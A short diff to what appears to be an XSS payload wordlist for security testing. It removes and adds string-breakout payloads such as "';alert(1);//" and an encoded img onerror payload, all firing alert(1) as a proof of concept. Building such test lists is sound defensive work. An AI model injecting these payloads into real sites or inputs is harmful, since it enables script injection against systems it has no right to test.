@@ -1,6 +1,5 @@
-'; alert(1); //
-"; alert(1); //
-'-alert(1)-'
 "-alert(1)-"
-</script><script>alert(1)</script>
-\'; alert(1); //
+';alert(1);//
+\';alert(1);//
+");alert(1);
+\u003cimg src=x onerror=alert(1)\u003e
